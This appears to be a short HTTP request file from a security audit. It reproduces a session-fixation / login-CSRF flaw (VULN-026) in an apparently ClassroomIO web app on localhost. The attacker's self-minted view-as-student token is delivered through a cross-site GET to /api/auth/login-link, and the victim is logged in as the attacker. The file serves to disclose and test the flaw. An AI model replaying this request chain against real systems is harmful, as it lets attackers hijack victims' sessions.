### VULN-026 — attacker self-mints, victim's cross-site GET fixes the session to attacker's account
POST http://localhost:21527/account/view-as-student-token HTTP/1.1
Cookie: classroomio.session_token=<ATTACKER>

{}

### victim browser (no Origin, no CSRF token) — a plain top-level navigation:
GET http://localhost:21527/api/auth/login-link?token=<ATTACKER_TOKEN> HTTP/1.1
Host: localhost:21527

### victim is now authenticated AS THE ATTACKER:
GET http://localhost:21527/api/auth/get-session HTTP/1.1
